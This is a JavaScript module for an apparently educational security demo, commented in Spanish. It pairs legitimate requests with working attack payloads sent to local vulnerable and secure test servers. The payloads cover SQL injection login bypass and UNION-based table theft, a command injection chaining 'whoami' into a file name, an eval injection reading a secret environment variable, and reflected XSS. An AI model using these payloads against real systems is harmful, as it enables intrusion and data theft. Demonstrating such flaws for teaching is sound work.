// Cada escenario tiene un uso legítimo (debe funcionar siempre) y un ataque
// (debe funcionar en el servidor vulnerable y fallar en el seguro).
// Solo se atacan servidores locales levantados por esta misma demo.

const getText = async (url) => {
  const r = await fetch(url);
  return { status: r.status, text: await r.text() };
};

const postJson = async (url, body) => {
  const r = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  return { status: r.status, text: await r.text() };
};

export const scenarios = [
  {
    id: 'sqli-login',
    title: 'SQL Injection — saltarse el login',
    payload: `username: admin'--   password: (cualquiera)`,
    legit: async (base) => (await postJson(`${base}/login`, { username: 'alice', password: 'alice123' })).status === 200,
    attack: async (base) => {
      const { status, text } = await postJson(`${base}/login`, { username: "admin'--", password: 'x' });
      return { exploited: status === 200 && text.includes('"admin"'), evidence: text };
    },
  },
  {
    id: 'sqli-union',
    title: 'SQL Injection (UNION) — robar la tabla de usuarios',
    payload: `category: x' UNION SELECT id,username,password,0 FROM users--`,
    legit: async (base) => (await getText(`${base}/products?category=perifericos`)).text.includes('Teclado'),
    attack: async (base) => {
      const category = encodeURIComponent("x' UNION SELECT id,username,password,0 FROM users--");
      const { text } = await getText(`${base}/products?category=${category}`);
      return { exploited: text.includes('S3cr3t-Adm1n!'), evidence: text };
    },
  },
  {
    id: 'cmd-injection',
    title: 'Command Injection — ejecutar comandos del sistema',
    payload: `file: notes.txt && echo INYECTADO && whoami`,
    legit: async (base) => (await getText(`${base}/wordcount?file=notes.txt`)).text.includes('palabras'),
    attack: async (base) => {
      const file = encodeURIComponent('notes.txt && echo INYECTADO && whoami');
      const { text } = await getText(`${base}/wordcount?file=${file}`);
      return { exploited: text.includes('INYECTADO'), evidence: text };
    },
  },
  {
    id: 'code-injection',
    title: 'Code Injection (eval) — leer secretos del proceso',
    payload: `expr: process.env.SECRET_KEY`,
    legit: async (base) => JSON.parse((await getText(`${base}/calc?expr=${encodeURIComponent('2+3*(4-1)')}`)).text).result === '11',
    attack: async (base) => {
      const { text } = await getText(`${base}/calc?expr=${encodeURIComponent('process.env.SECRET_KEY')}`);
      return { exploited: text.includes('sk_demo_'), evidence: text };
    },
  },
  {
    id: 'xss',
    title: 'XSS reflejado — inyectar un <script> en la página',
    payload: `name: <script>alert(document.cookie)</script>`,
    legit: async (base) => (await getText(`${base}/hello?name=Ana`)).text.includes('Hola, Ana'),
    attack: async (base) => {
      const name = '<script>alert(document.cookie)</script>';
      const { text } = await getText(`${base}/hello?name=${encodeURIComponent(name)}`);
      return { exploited: text.includes(name), evidence: text };
    },
  },
];
